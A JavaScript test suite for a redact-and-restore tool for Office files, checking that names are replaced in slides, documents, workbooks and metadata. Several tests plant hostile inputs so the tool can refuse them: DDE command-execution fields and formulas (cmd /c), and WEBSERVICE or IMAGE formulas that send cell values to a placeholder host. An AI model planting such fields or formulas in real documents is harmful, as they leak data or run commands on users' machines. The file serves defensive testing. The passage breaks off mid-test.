// Run: node --test "tools/redact-restore/*.test.mjs"
//
// Tests the Word, PowerPoint and Excel support (OfficeCore) on the files in
// fixtures/: each plants the places a name hides in a real Office file, and
// each comes twice, once written by Python's Office libraries and once
// re-saved by LibreOffice. The code under test is the page's own script,
// extracted from redact-restore.html, as in redact-restore.test.mjs.
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";
import vm from "node:vm";

import { blocks } from "./update-csp.mjs";

const HERE = dirname(fileURLToPath(import.meta.url));
const { script } = blocks(readFileSync(join(HERE, "redact-restore.html"), "utf8"));
const ctx = vm.createContext({ TextEncoder, TextDecoder, ReadableStream, DecompressionStream, CompressionStream, atob });
vm.runInContext(`${script}\nthis.R = RedactCore; this.O = OfficeCore;`, ctx);
const { R, O } = ctx;

const fixture = (name) => new Uint8Array(readFileSync(join(HERE, "fixtures", name)));
const LISTS = { COMPANY: "Dalton Computers\nBest Byte\nValuMart", PERSON: "Rachel Kim\nMarcus Webb\nTaylor Brooks", PRODUCT: "Project Falcon\nFalcon\nVantage 16" };
const OPTS = { email: true, phone: true, ssn: true, card: true, money: false, url: false, terms: "store 4471", lists: LISTS };
const ORIGINALS = ["Dalton Computers", "Best Byte", "ValuMart", "Rachel Kim", "Marcus Webb", "Taylor Brooks", "Project Falcon", "Falcon", "rachel.kim@", "marcus.webb@", "taylor.brooks@", "555-0125", "555-0188", "4471", "Vantage 16"];

const dec = new TextDecoder();
const unescape = (s) => s.replace(/&(#x[0-9a-f]+|#\d+|amp|lt|gt|quot|apos);/gi, (_, e) => (e[0] === "#" ? String.fromCodePoint(e[1] === "x" ? parseInt(e.slice(2), 16) : +e.slice(1)) : { amp: "&", lt: "<", gt: ">", quot: '"', apos: "'" }[e]));

/** Every original value found in any text part of a file (and of the files embedded in it). */
async function survivors(bytes, where = "") {
  const found = [];
  for (const e of await O.readZip(bytes)) {
    if (/\.(xlsx|docx|pptx)$/i.test(e.name)) found.push(...(await survivors(e.data, `${where}${e.name} → `)));
    if (!/\.(xml|rels|vml)$/i.test(e.name)) continue;
    const text = unescape(dec.decode(e.data)).toLowerCase();
    for (const o of ORIGINALS) if (text.includes(o.toLowerCase())) found.push(`${where}${e.name}: ${o}`);
  }
  return found;
}

async function redact(name, settings = {}) {
  const pkg = await O.open(fixture(name));
  const session = new R.Session();
  const sheetActions = {};
  if (pkg.kind === "xlsx") for (const sh of pkg.summary.sheets) sheetActions[sh.name] = sh.header.map((h) => R.suggestAction(h));
  const res = await O.redactPackage(pkg, OPTS, session, { pictures: "gray", identity: true, sheetActions, ...settings });
  return { pkg, session, res };
}

const part = async (bytes, name) => dec.decode((await O.readZip(bytes)).find((e) => e.name === name).data);

for (const name of ["deck.pptx", "deck-lo.pptx", "doc.docx", "doc-lo.docx", "book.xlsx", "book-lo.xlsx"]) {
  test(`${name}: the redacted copy holds none of the originals, anywhere`, async () => {
    const { res } = await redact(name);
    assert.deepEqual([...res.report.leaks], []);
    assert.deepEqual([...res.report.blockers], []);
    assert.ok(res.bytes, "a copy was made");
    assert.deepEqual(await survivors(res.bytes), []);
    // It is still a file Office can open: every part is there and every XML part is whole.
    const reopened = await O.open(res.bytes);
    assert.equal(reopened.kind, (await O.open(fixture(name))).kind);
    for (const e of await O.readZip(res.bytes)) {
      if (!/\.(xml|rels)$/.test(e.name)) continue;
      const toks = O.tokenize(dec.decode(e.data)).filter((t) => !t.text && !/^<[?!]/.test(t.s) && !/\/>$/.test(t.s));
      let depth = 0;
      for (const t of toks) depth += t.s.startsWith("</") ? -1 : 1;
      assert.equal(depth, 0, `${e.name} is balanced`);
    }
  });

  test(`${name}: restoring the redacted copy brings back the original text`, async () => {
    const { pkg, session, res } = await redact(name, { sheetActions: undefined });
    const restored = await O.restorePackage(await O.open(res.bytes), session.key);
    assert.deepEqual([...restored.unknown], []);
    // One number written two ways shares a placeholder and comes back in the
    // form first seen, as in plain text, so phone numbers compare by digits.
    const digits = (s) => s.replace(/\(?\b(\d{3})\)?[\s.-]?(\d{3})[\s.-](\d{4})\b/g, "$1$2$3");
    const before = O.extractText(pkg);
    const after = O.extractText(await O.open(restored.bytes));
    assert.equal(digits(after), digits(before));
  });
}

test("deck: a name split across formatting runs becomes one placeholder, in the first run", async () => {
  const { res } = await redact("deck.pptx");
  const slide = await part(res.bytes, "ppt/slides/slide2.xml");
  assert.match(slide, /<a:t>Endcaps at \[COMPANY-\d+\]<\/a:t>.*<a:t><\/a:t>.*<a:t> and \[COMPANY-\d+\] start Nov 9\.<\/a:t>/s);
  // The formatting of every run is kept.
  assert.equal((slide.match(/<a:r>/g) || []).length, (dec.decode((await O.readZip(fixture("deck.pptx"))).find((e) => e.name === "ppt/slides/slide2.xml").data).match(/<a:r>/g) || []).length);
});

test("deck: notes, the hidden slide, the comment, alt text and the chart's data are redacted; names saved in the file are cleared", async () => {
  const { res } = await redact("deck.pptx");
  const text = res.text;
  assert.match(text, /Notes: Remind \[PERSON-\d+\] that \[PRODUCT-\d+\] is under NDA/);
  assert.match(text, /Slide 6 \(hidden\)\nHidden: pricing\nDo not share: \[PRODUCT-\d+\] pricing for \[COMPANY-\d+\]/);
  assert.match(text, /Comment: Confirm the \[COMPANY-\d+\] date with \[PERSON-\d+\]\./);
  assert.match(await part(res.bytes, "ppt/slides/slide4.xml"), /name="\[COMPANY-\d+\] photo" descr="\[COMPANY-\d+\] endcap photo, \[TERM-1\]"/);
  assert.match(await part(res.bytes, "ppt/commentAuthors.xml"), /name="Reviewer" initials="R"/);
  assert.match(await part(res.bytes, "docProps/core.xml"), /<dc:creator><\/dc:creator>/);
  assert.match(await part(res.bytes, "docProps/app.xml"), /<Company><\/Company><Manager><\/Manager><\/Properties>/);
  assert.equal(res.report.embedded, 1, "the chart's workbook was redacted too");
  assert.match(await part(res.bytes, "ppt/charts/chart1.xml"), /<c:v>\[COMPANY-\d+\]<\/c:v>/);
});

test("deck: every picture and the preview thumbnail become gray, and the links that pointed at them follow", async () => {
  const { res } = await redact("deck.pptx");
  assert.equal(res.report.pictures, 2);
  const files = await O.readZip(res.bytes);
  const names = files.map((e) => e.name);
  assert.ok(names.includes("docProps/thumbnail.png") && !names.includes("docProps/thumbnail.jpeg"));
  assert.match(await part(res.bytes, "_rels/.rels"), /Target="docProps\/thumbnail\.png"/);
  const gray = files.find((e) => e.name === "ppt/media/image1.png").data;
  assert.equal(gray.length, 80);
  // Kept when the person says so.
  const kept = await redact("deck.pptx", { pictures: "keep" });
  assert.equal(kept.res.report.pictures, 0);
});

test("doc: tracked deletions are removed, headers and footers redacted, the email link redacted", async () => {
  const { res } = await redact("doc.docx");
  assert.equal(res.report.deletions, 1);
  const body = await part(res.bytes, "word/document.xml");
  assert.doesNotMatch(body, /w:delText|pricing for/);
  assert.match(body, /<w:ins [^>]*w:author="Reviewer"/);
  assert.match(res.text, /^Header: Confidential: \[COMPANY-\d+\]/);
  assert.match(res.text, /Footer: Prepared by \[PERSON-\d+\]/);
  assert.match(res.text, /Comment: Check the dates with \[PERSON-\d+\]\./);
  assert.match(await part(res.bytes, "word/_rels/document.xml.rels"), /Target="mailto:\[EMAIL-1\]"/);
  assert.match(body, /descr="\[COMPANY-\d+\] shelf, \[TERM-1\]"/);
});

test("book: every sheet, hidden ones too, follows its own column choices; formulas follow renamed sheets and names", async () => {
  const { res } = await redact("book.xlsx");
  const wb = await part(res.bytes, "xl/workbook.xml");
  assert.match(wb, /<sheet [^>]*name="COMPANY-\d+ Weekly"/);
  assert.match(wb, /<definedName name="PRODUCT_\d+Units">'COMPANY-\d+ Weekly'!\$B\$2:\$B\$4<\/definedName>/);
  assert.match(wb, /fullCalcOnLoad="1"/);
  const sheet1 = await part(res.bytes, "xl/worksheets/sheet1.xml");
  assert.match(sheet1, /<f>'COMPANY-\d+ Weekly'!B5<\/f>/);
  assert.match(sheet1, /<formula1>"\[COMPANY-\d+\],\[COMPANY-\d+\]"<\/formula1>/);
  assert.match(sheet1, /&amp;L\[COMPANY-\d+\]|&L\[COMPANY-\d+\]/);
  // Contact Email and Notes are dropped: the header stays, the cells under it are empty.
  assert.match(sheet1, /<c r="D2"\/>/);
  assert.match(sheet1, /<c r="G2"\/>/);
  assert.match(res.text, /^Sheet: Pipeline\nOpportunity,Account,Contact Name,Amount,Close Date\nOPP-1001,\[COMPANY-\d+\],\[PERSON-\d+\],21000,2026-11-25/);
  // The hidden sheet's only column is dropped, so nothing of it is left to read.
  assert.match(res.text, /Sheet: Notes \(hidden\)\n?$/);
  assert.match(await part(res.bytes, "xl/comments/comment1.xml"), /<author>Reviewer<\/author>/);
});

test("book: restoring a workbook Claude made puts the sheet's real name back, in its formulas too", async () => {
  const { session, res } = await redact("book.xlsx", { sheetActions: undefined });
  const restored = await O.restorePackage(await O.open(res.bytes), session.key);
  const wb = await part(restored.bytes, "xl/workbook.xml");
  assert.match(wb, /<sheet [^>]*name="Best Byte Weekly"/);
  assert.match(await part(restored.bytes, "xl/worksheets/sheet1.xml"), /<f>'Best Byte Weekly'!B5<\/f>/);
});

test("a name saved in the file's properties that is still in the text stops the copy, and says where", async () => {
  const pkg = await O.open(fixture("deck.pptx"));
  const res = await O.redactPackage(pkg, { ...OPTS, lists: { ...LISTS, PERSON: "Rachel Kim\nMarcus Webb" } }, new R.Session(), { pictures: "gray", identity: true });
  assert.equal(res.bytes, undefined);
  const leak = res.report.leaks.find((l) => l.value === "Taylor Brooks");
  assert.ok(leak, "Taylor Brooks is reported");
  assert.equal(O.partLabel(pkg, leak.part), "slide 1");
});

test("videos, macros, old formats and broken files are refused, never half-redacted", async () => {
  const files = await O.readZip(fixture("deck.pptx"));
  const withVideo = await O.writeZip([...files, { name: "ppt/media/media1.mp4", data: new Uint8Array([0, 0, 0, 24]) }]);
  const pkg = await O.open(withVideo);
  assert.deepEqual([...pkg.summary.blockers.map((b) => b.why)], ["media"]);
  const res = await O.redactPackage(pkg, OPTS, new R.Session(), {});
  assert.equal(res.bytes, undefined);

  const macro = await O.writeZip(files.map((e) => (e.name === "[Content_Types].xml" ? { name: e.name, data: new TextEncoder().encode(dec.decode(e.data).replace("presentationml.presentation.main+xml", "presentationml.presentation.macroEnabled.main+xml")) } : e)));
  await assert.rejects(O.open(macro), /macros/);
  await assert.rejects(O.open(new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1, 0, 0])), /compound/);
  await assert.rejects(O.open(new TextEncoder().encode("not a zip at all")), /not-zip/);
  const doctype = await O.writeZip(files.map((e) => (e.name === "ppt/slides/slide1.xml" ? { name: e.name, data: new TextEncoder().encode('<!DOCTYPE x [<!ENTITY a "b">]>' + dec.decode(e.data)) } : e)));
  await assert.rejects(O.redactPackage(await O.open(doctype), OPTS, new R.Session(), {}), /doctype/);
});

const edit = async (bytes, name, fn) => O.writeZip([...(await O.readZip(bytes))].map((e) => (e.name === name ? { name: e.name, data: new TextEncoder().encode(fn(dec.decode(e.data))) } : e)));

test("a Word file with a field that fetches a path or a web address gets no real values back", async () => {
  const { session, res } = await redact("doc.docx");
  const field = (code) => `<w:body><w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>${code}<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>`;
  for (const code of [
    '<w:r><w:instrText xml:space="preserve"> INCLUDEPICTURE "\\\\files\\share\\x.png" </w:instrText></w:r>',
    // Split across runs, with a nested REF that would read a restored bookmark.
    '<w:r><w:instrText> INCLUDEPIC</w:instrText></w:r><w:r><w:instrText>TURE "https://x.example/" </w:instrText></w:r>',
    '<w:r><w:instrText> LINK Excel.Sheet.12 "C:\\x.xlsx" </w:instrText></w:r>',
    '<w:r><w:instrText> DDEAUTO cmd "/c x" </w:instrText></w:r>',
    // Read as Word reads it: in CDATA, with an entity, under another prefix.
    '<w:r><w:instrText><![CDATA[ INCLUDETEXT "x.docx" ]]></w:instrText></w:r>',
    '<w:r><w:instrText> &#73;NCLUDETEXT "x.docx" </w:instrText></w:r>',
    '<w:r><ns0:instrText xmlns:ns0="http://schemas.openxmlformats.org/wordprocessingml/2006/main"> LINK x </ns0:instrText></w:r>',
  ]) {
    const risky = await edit(res.bytes, "word/document.xml", (x) => x.replace("<w:body>", field(code)));
    await assert.rejects(O.restorePackage(await O.open(risky), session.key), /fetches/, code);
  }
  const simple = await edit(res.bytes, "word/document.xml", (x) => x.replace("<w:body>", '<w:body><w:p><w:fldSimple w:instr=" INCLUDETEXT \\\\files\\x.docx "><w:r><w:t>x</w:t></w:r></w:fldSimple></w:p>'));
  await assert.rejects(O.restorePackage(await O.open(simple), session.key), /fetches/);
  // A field in the glossary (building blocks) counts too.
  const glossary = await O.writeZip([...(await O.readZip(res.bytes)), { name: "word/glossary/document.xml", data: new TextEncoder().encode('<w:document><w:body><w:p><w:fldSimple w:instr=" INCLUDETEXT x "/></w:p></w:body></w:document>') }]);
  await assert.rejects(O.restorePackage(await O.open(glossary), session.key), /fetches/);
  // A field that is begun and never ended still counts.
  const unended = await edit(res.bytes, "word/document.xml", (x) => x.replace("<w:body>", '<w:body><w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> INCLUDETEXT x </w:instrText></w:r></w:p>'));
  await assert.rejects(O.restorePackage(await O.open(unended), session.key), /fetches/);
  // A page number or a hyperlink (which fetches only when clicked) is fine.
  const safe = await edit(res.bytes, "word/document.xml", (x) => x.replace("<w:body>", field('<w:r><w:instrText> PAGE </w:instrText></w:r>') + field('<w:r><w:instrText> HYPERLINK "https://x.example/" </w:instrText></w:r>').slice(8)));
  assert.ok((await O.restorePackage(await O.open(safe), session.key)).replaced > 0);
});

test("a restored file's properties keep their placeholders", async () => {
  const { session, res } = await redact("doc.docx");
  const props = await edit(res.bytes, "docProps/app.xml", (x) => x.replace("</Properties>", "<HyperlinkBase>files/[PERSON-01]/</HyperlinkBase></Properties>"));
  const r = await O.restorePackage(await O.open(props), session.key);
  assert.match(await part(r.bytes, "docProps/app.xml"), /<HyperlinkBase>files\/\[PERSON-01\]\/<\/HyperlinkBase>/);
  assert.ok(r.inLinks >= 1);
});

test("restore refuses a file with macros or controls, and stops at two levels of files inside files", async () => {
  const { session, res } = await redact("doc.docx");
  const entries = await O.readZip(res.bytes);
  const vba = await O.writeZip([...entries, { name: "word/vbaProjectSignature.bin", data: new Uint8Array(8) }]);
  await assert.rejects(O.restorePackage(await O.open(vba), session.key), /blocked/);
  const activeX = await O.writeZip([...entries, { name: "word/activeX/activeX1.xml", data: new TextEncoder().encode("<x/>") }]);
  await assert.rejects(O.restorePackage(await O.open(activeX), session.key), /blocked/);
  // A video is only played, so a file with one still restores.
  const video = await O.writeZip([...entries, { name: "word/media/clip1.mp4", data: new Uint8Array([0, 0, 0, 24]) }]);
  assert.ok((await O.restorePackage(await O.open(video), session.key)).replaced > 0);
  let nested = res.bytes;
  for (let k = 0; k < 3; k++) nested = await O.writeZip([...entries, { name: `word/embeddings/inner${k}.docx`, data: nested }]);
  await assert.rejects(O.restorePackage(await O.open(nested), session.key), /too-deep/);
  let two = res.bytes;
  for (let k = 0; k < 2; k++) two = await O.writeZip([...entries, { name: `word/embeddings/inner${k}.docx`, data: two }]);
  assert.ok((await O.restorePackage(await O.open(two), session.key)).replaced > 0);
});

test("a workbook that can send data out when Excel recalculates gets no real values back", async () => {
  const { session, res } = await redact("book.xlsx", { sheetActions: undefined });
  const refused = async (bytes, why, what) => assert.rejects(O.restorePackage(await O.open(bytes), session.key), (e) => e.message === "calls-out" && (!why || e.detail === why), what);
  const cell = (inner) => edit(res.bytes, "xl/worksheets/sheet1.xml", (x) => x.replace("<f>SUM(E2:E4)</f>", inner));
  for (const [formula, why] of [
    ['WEBSERVICE("https://example.test/?q="&amp;B2)', "WEBSERVICE"],
    ["RTD(&quot;feed&quot;,,B2)", "RTD"],
    ['IMAGE("https://example.test/"&amp;B2)', "IMAGE"],
    ['_xlfn.IMAGE("https://example.test/a.png")', "IMAGE"],
    ['HYPERLINK("https://a.example/?e="&amp;B2)', "HYPERLINK"],
    ['HYPERLINK("https://a.example/?e="&amp;"x")', "HYPERLINK"],
    ["MyAddIn(B2)", "MYADDIN"],
    ["[1]Sheet1!A1", ""],
    ["'C:\\x\\[Book.xlsx]Sheet1'!A1", ""],
    ["cmd|'/c calc'!A0", ""],
    // Read as Excel reads it: an entity, CDATA.
    ["&#87;EBSERVICE(B2)", "WEBSERVICE"],
    ['<![CDATA[WEBSERVICE("https://example.test/")]]>', "WEBSERVICE"],
  ]) {
    await refused(await cell(`<f>${formula}</f>`), why, formula);
  }
  await refused(await cell('<x:f xmlns:x="http://schemas.openxmlformats.org/spreadsheetml/2006/main">WEBSERVICE(B2)</x:f>'), "WEBSERVICE", "prefixed");
  // Formulas outside cells: data validation, conditional formatting, names, charts, pivot fields.
  await refused(await edit(res.bytes, "xl/worksheets/sheet1.xml", (x) => x.replace(/<formula1>[^<]*<\/formula1>/, "<formula1>WEBSERVICE(B2)</formula1>")), "WEBSERVICE", "formula1");
  await refused(await edit(res.bytes, "xl/worksheets/sheet1.xml", (x) => x.replace("</worksheet>", '<conditionalFormatting sqref="A1"><cfRule type="expression" priority="1"><formula>WEBSERVICE(B2)</formula></cfRule></conditionalFormatting></worksheet>')), "WEBSERVICE", "cfRule");
  await refused(await edit(res.bytes, "xl/workbook.xml", (x) => x.replace(/(<definedName\b[^>]*>)[^<]*/, (_, tag) => `${tag}[1]Sheet1!$A$1`)), "", "definedName");
  const entries = await O.readZip(res.bytes);
  const add = (name, xml, type) =>
    O.writeZip([
      ...entries.map((e) => (type && e.name === "[Content_Types].xml" ? { name: e.name, data: new TextEncoder().encode(dec.decode(e.data).replace("</Types>", `<Override PartName="/${name}" ContentType="${type}"/></Types>`)) } : e)),
      { name, data: new TextEncoder().encode(xml) },
    ]);
  await refused(await add("xl/charts/chart9.xml", '<c:chartSpace xmlns:c="http://schemas.openxmlformats.org/drawingml/2006/chart"><c:f>[1]Sheet1!$A$1</c:f></c:chartSpace>'), "", "chart");
  await refused(await add("xl/pivotCache/pivotCacheDefinition1.xml", '<pivotCacheDefinition><cacheFields><cacheField name="x" formula="WEBSERVICE(A1)"/></cacheFields></pivotCacheDefinition>'), "WEBSERVICE", "pivot field");
  // Connections, live queries and Power Query, found wherever they are.
  await refused(await add("xl/stuff.xml", "<connections/>", "application/vnd.openxmlformats-officedocument.spreadsheetml.connections+xml"), "", "connections elsewhere");
  await refused(await add("xl/other/thing.xml", "<externalLink/>", "application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml"), "", "external link elsewhere");
  const byExtension = await O.writeZip([
    ...entries.map((e) => (e.name === "[Content_Types].xml" ? { name: e.name, data: new TextEncoder().encode(dec.decode(e.data).replace("officedocument.vmlDrawing", "officedocument.spreadsheetml.connections+xml")) } : e)),
    { name: "xl/data.vml", data: new TextEncoder().encode("<connections/>") },
  ]);
  await refused(byExtension, "", "connections typed by extension");
  await refused(await add("customXml/item7.xml", '<DataMashup xmlns="http://schemas.microsoft.com/DataMashup">AAAA</DataMashup>'), "", "Power Query");
});

test("a workbook of ordinary formulas restores, and a link's text stays a placeholder", async () => {
  const { session, res } = await redact("book.xlsx", { sheetActions: undefined });
  const formulas = [
    "_xlfn.XLOOKUP(B2,A2:A4,C2:C4)",
    "_xlfn.IFS(B2&gt;1,1,TRUE,0)",
    "SUM(Table1[Col])+COUNTA(Table1[[#Headers],[Col]])",
    "SUMIFS(E2:E4,B2:B4,&quot;x&quot;)+'Q1 (East)'!A1",
    "_xlfn.LET(_xlpm.x,1,_xlpm.x+1)",
    'IFERROR(VLOOKUP(B2,A:C,3,FALSE),"")',
    // What current Excel writes: two prefixes, spill references, @, a lambda called by name.
    "_xlfn._xlws.SORT(A1:A3)",
    "SUM(_xlfn.ANCHORARRAY(A1))+_xlfn.SINGLE(A1:A3)",
    "_xlfn.LET(_xlpm.f,_xlfn.LAMBDA(_xlpm.x,_xlpm.x+1),_xlpm.f(2))",
  ];
  const ok = await edit(res.bytes, "xl/worksheets/sheet1.xml", (x) => x.replace("<f>SUM(E2:E4)</f>", formulas.map((f) => `<f>${f}</f>`).join("")));
  assert.ok((await O.restorePackage(await O.open(ok), session.key)).replaced > 0);
  const link = await edit(res.bytes, "xl/worksheets/sheet1.xml", (x) => x.replace("<f>SUM(E2:E4)</f>", '<f>HYPERLINK("https://x.example/?u=[PERSON-01]","[PERSON-01]")</f>'));
  const r = await O.restorePackage(await O.open(link), session.key);
  assert.match(await part(r.bytes, "xl/worksheets/sheet1.xml"), /<f>HYPERLINK\("https:\/\/x\.example\/\?u=\[PERSON-01\]","\[PERSON-01\]"\)<\/f>/);
  assert.ok(r.inLinks >= 2);
});

test("checking a workbook's formulas stays fast on a very large sheet", async () => {
  const { session, res } = await redact("book.xlsx", { sheetActions: undefined });
  const many = await edit(res.bytes, "xl/worksheets/sheet1.xml", (x) => x.replace("<f>SUM(E2:E4)</f>", "<f>SUM(E2:E4)</f>".repeat(100000)));
  const t = Date.now();
  await O.restorePackage(await O.open(many), session.key);
  assert.ok(Date.now() - t < 15000, `${Date.now() - t} ms`);
});

test("a name in a printer-settings part (stored as UTF-16) stops the copy", async () => {
  const files = await O.readZip(fixture("deck.pptx"));
  const name = "\\\\BEST BYTE-PRINT01";
  const bin = new Uint8Array(220);
  for (let i = 0; i < name.length; i++) bin[i * 2] = name.charCodeAt(i);
  const deck = await O.writeZip([...files].map((e) => (e.name === "ppt/printerSettings/printerSettings1.bin" ? { name: e.name, data: bin } : e)));
  const res = await O.redactPackage(await O.open(deck), OPTS, new R.Session(), { pictures: "gray", identity: true });
  assert.equal(res.bytes, undefined);
  assert.ok(res.report.leaks.some((l) => l.part === "ppt/printerSettings/printerSettings1.bin" && l.value === "Best Byte"));
});

test("a zip that unpacks past the limit is refused", async () => {
  const big = await O.writeZip([{ name: "[Content_Types].xml", data: new Uint8Array(4 * 2 ** 20) }]);
  const saved = O.LIMITS.totalBytes;
  O.LIMITS.totalBytes = 2 ** 20;
  try {
    await assert.rejects(O.readZip(big), /too-large/);
  } finally {
    O.LIMITS.totalBytes = saved;
  }
});

test("zip round trip keeps every byte, and the checksum matches the standard one", async () => {
  const parts = [
    { name: "a.xml", data: new TextEncoder().encode("<a>hello</a>".repeat(100)) },
    { name: "b.png", data: new Uint8Array([137, 80, 78, 71, 1, 2, 3]) },
  ];
  const back = await O.readZip(await O.writeZip(parts));
  assert.deepEqual([...back].map((e) => [e.name, [...e.data]]), parts.map((e) => [e.name, [...e.data]]));
  assert.equal(O.crc32(new TextEncoder().encode("123456789")), 0xcbf43926);
});

test("distribute puts a split name's placeholder in the first piece and removes the rest of the name", () => {
  const pieces = [{ text: "Endcaps at Best " }, { text: "Byte" }, { text: " and ValuMart." }];
  const plan = [
    { start: 11, end: 20, out: "[COMPANY-01]" },
    { start: 25, end: 33, out: "[COMPANY-02]" },
  ];
  assert.deepEqual([...O.distribute(pieces, plan)], ["Endcaps at [COMPANY-01]", "", " and [COMPANY-02]."]);
});

/** A copy of a fixture with one XML part edited, re-zipped. */
async function edited(name, partName, edit) {
  const entries = await O.readZip(fixture(name));
  const out = entries.map((e) => (e.name === partName ? { ...e, data: new TextEncoder().encode(edit(dec.decode(e.data))) } : e));
  return O.writeZip(out);
}

test("a listed person's first name alone is hidden in an Office file, and the leak gate looks for it the way it was matched", async () => {
  const bytes = await edited("doc.docx", "word/document.xml", (x) => x.replace("Rachel Kim approved the ", "Rachel approved the grace period for Grace, and Rachel Kim the "));
  const pkg = await O.open(bytes);
  const opts = { ...OPTS, lists: { ...LISTS, PERSON: `${LISTS.PERSON}\nGrace Liu` } };
  const res = await O.redactPackage(pkg, opts, new R.Session(), { pictures: "gray", identity: true });
  // "grace period" is not Grace Liu, so it is neither replaced nor reported as a leak.
  assert.deepEqual([...res.report.leaks], []);
  const body = await part(res.bytes, "word/document.xml");
  assert.match(body, /\[PERSON-\d+\] approved the grace period for \[PERSON-\d+\]/);
  assert.doesNotMatch(body, /Rachel|Grace\b/);
});

test("a workbook's masked name column hides a first name alone in a kept Notes column", async () => {
  const bytes = await edited("book.xlsx", "xl/worksheets/sheet1.xml", (x) => x.replace("Falcon samples for the Best Byte endcap.", "Rachel wants Falcon samples for the Best Byte endcap."));
  const pkg = await O.open(bytes);
  const sheetActions = {};
  for (const sh of pkg.summary.sheets) sheetActions[sh.name] = sh.header.map((h) => (/notes/i.test(h) ? "keep" : R.suggestAction(h)));
  // No People list: the names come only from the masked Contact Name column.
  const opts = { ...OPTS, lists: { ...LISTS, PERSON: "" } };
  const res = await O.redactPackage(pkg, opts, new R.Session(), { pictures: "gray", identity: true, sheetActions });
  assert.deepEqual([...res.report.leaks], []);
  // Rachel Kim's first name alone takes her full name's placeholder.
  assert.match(res.text, /,(\[CONTACT-NAME-\d+\]),\d+,2027-01-15,\1 wants \[PRODUCT-\d+\] samples/);
});

test("an alias is hidden in an Office file too, and the leak gate looks for it as typed", async () => {
  const bytes = await edited("doc.docx", "word/document.xml", (x) => x.replace("Rachel Kim approved the ", "Rach approved the rachel-free "));
  const pkg = await O.open(bytes);
  const opts = { ...OPTS, lists: { ...LISTS, PERSON: LISTS.PERSON.replace("Rachel Kim", "Rachel Kim | Rach") } };
  const res = await O.redactPackage(pkg, opts, new R.Session(), { pictures: "gray", identity: true });
  assert.deepEqual([...res.report.leaks], []);
  assert.match(await part(res.bytes, "word/document.xml"), /\[PERSON-\d+\] approved the rachel-free /);
});

test("the leak gate finds a capitalized name part that survived, and ignores the same word in lower case", () => {
  const xml = (t) => [{ name: "word/document.xml", data: new TextEncoder().encode(`<w:document><w:t>${t}</w:t></w:document>`) }];
  assert.equal(O.findLeaks(xml("Grace said yes"), [], ["Grace"]).length, 1);
  assert.equal(O.findLeaks(xml("the grace period"), [], ["Grace"]).length, 0);
});

test("an Excel name is renamed only where a name part appears as written: graceDays is not Grace Liu", async () => {
  // (Excel names ignore case, so one workbook can't hold both graceDays and GraceDays.)
  const bytes = await edited("book.xlsx", "xl/workbook.xml", (x) => x.replace("</definedNames>", "<definedName name=\"graceDays\">Pipeline!$A$1</definedName></definedNames>"));
  const pkg = await O.open(bytes);
  const sheetActions = {};
  for (const sh of pkg.summary.sheets) sheetActions[sh.name] = sh.header.map((h) => R.suggestAction(h));
  const opts = { ...OPTS, lists: { ...LISTS, PERSON: `${LISTS.PERSON}\nGrace Liu` } };
  const res = await O.redactPackage(pkg, opts, new R.Session(), { pictures: "gray", identity: true, sheetActions });
  const wb = await part(res.bytes, "xl/workbook.xml");
  assert.match(wb, /name="graceDays"/);
  assert.match(wb, /name="PRODUCT_\d+Units"/);
});

test("the data pack's practice files work as the exercise says: listed names hidden, unlisted ones suggested, nothing real", async () => {
  const PRACTICE = join(HERE, "..", "..", "data-pack", "redact-practice");
  // The lists the data pack README tells you to type.
  const lists = { COMPANY: "Dalton Computers\nBest Byte\nValuMart\nHalcrest Retail Partners", PERSON: "Rachel Kim\nTessa Monroe\nTaylor Brooks", PRODUCT: "Project Kestrel | Kestrel" };
  const opts = { ...OPTS, terms: "", lists };
  // The real companies the data pack's look-alikes stand in for (the private
  // checker holds the full list, including names this public kit never prints).
  const REAL = /\b(Best Buy|Walmart|Wal-Mart|Micro Center|Costco|Target|Dell|Alienware|Samsung|Hewlett|HP|Lenovo|Salesforce\.com)\b/;
  const suggested = new Set();
  for (const name of ["kestrel-launch-plan.pptx", "kestrel-memo.docx", "kestrel-sell-in.xlsx"]) {
    const pkg = await O.open(new Uint8Array(readFileSync(join(PRACTICE, name))));
    assert.doesNotMatch(O.extractText(pkg), REAL, name);
    const sheetActions = {};
    if (pkg.kind === "xlsx") for (const sh of pkg.summary.sheets) sheetActions[sh.name] = sh.header.map((h) => R.suggestAction(h));
    const res = await O.redactPackage(pkg, opts, new R.Session(), { pictures: "gray", identity: true, sheetActions });
    assert.deepEqual([...res.report.blockers], [], name);
    assert.deepEqual([...res.report.leaks], [], name);
    for (const v of ["Rachel Kim", "Tessa Monroe", "Taylor Brooks", "Kestrel", "Best Byte", "ValuMart", "Dalton Computers"]) assert.ok(!res.text.includes(v), `${name}: ${v}`);
    for (const x of R.suggestNames(res.text, opts)) suggested.add(x.name);
  }
  const email = readFileSync(join(PRACTICE, "kestrel-thread.eml"), "utf8");
  assert.equal(R.mimeProblem(email), null);
  const out = R.redactText(email, opts, new R.Session());
  for (const x of R.suggestNames(out, opts)) suggested.add(x.name);
  // The people the exercise leaves off the list, and the client's short name, are pointed out.
  for (const n of ["Keisha Daniels", "Priya Shah", "Daniels", "Dalton"]) assert.ok(suggested.has(n), `${n} not suggested: ${[...suggested].join(", ")}`);
});

test("a name with a no-break space in a Word document is redacted, and the gate looks for it the same way", async () => {
  const bytes = await edited("doc.docx", "word/document.xml", (x) => x.replace("Rachel Kim approved the ", "Dalton\u00A0Computers and Rachel\u00A0Kim approved the "));
  const res = await O.redactPackage(await O.open(bytes), OPTS, new R.Session(), { pictures: "gray", identity: true });
  assert.deepEqual([...res.report.leaks], []);
  assert.doesNotMatch(await part(res.bytes, "word/document.xml"), /Dalton|Rachel/);
});

test("a link with %20 in it is redacted, and a name the matcher missed in one is caught by the gate", async () => {
  const bytes = await edited("doc.docx", "word/_rels/document.xml.rels", (x) => x.replace("</Relationships>", '<Relationship Id="rIdSp" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://share.example/sites/Dalton%20Computers/Rachel%20Kim%20notes.docx" TargetMode="External"/></Relationships>'));
  const res = await O.redactPackage(await O.open(bytes), OPTS, new R.Session(), { pictures: "gray", identity: true });
  assert.deepEqual([...res.report.leaks], []);
